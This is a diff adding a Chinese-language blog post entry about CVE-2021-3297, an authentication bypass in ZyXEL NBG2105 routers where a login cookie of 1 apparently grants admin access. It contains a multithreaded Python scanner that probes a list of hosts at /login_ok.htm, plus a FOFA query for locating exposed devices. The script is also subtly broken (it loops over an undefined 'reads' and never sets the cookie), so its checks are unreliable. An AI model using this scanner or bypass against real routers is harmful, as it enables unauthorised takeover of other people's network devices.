@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CVE-2021-3297 ZyXEL NBG2105身份验证绕过</title>
+      <link href="2021/04/12/CVE-2021-3297/"/>
+      <url>2021/04/12/CVE-2021-3297/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>或许存在本身就毫无意义可言</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 在Zyxel NBG2105 V1.00（AAGU.2）C0设备上，将登录cookie设置为1可提供管理员访问权限。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;ZyXEL_url.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">threads=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">url,result_q</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=requests.get(url,timeout=<span class="number">5</span>)</span><br><span class="line">        html=result.text</span><br><span class="line">        status=result.status_code</span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">           print(url+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;存在漏洞&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           print(url+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;不存在漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line=line.strip()</span><br><span class="line">    tar=line+<span class="string">&quot;/login_ok.htm&quot;</span></span><br><span class="line">    t=threading.Thread(target=thread,args=(tar,Queue()))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reads:</span><br><span class="line">    i.join()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>通过更改 login参数可用实现后台登录进而修改其配置</p><blockquote><p>fofa语法：app=”ZyXEL-NBG2105”</p></blockquote><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041256225858529.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CVE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE-2020-25078 D-Link DCS系列监控</title>
       <link href="2021/04/11/CVE-2020-25078/"/>
       <url>2021/04/11/CVE-2020-25078/</url>
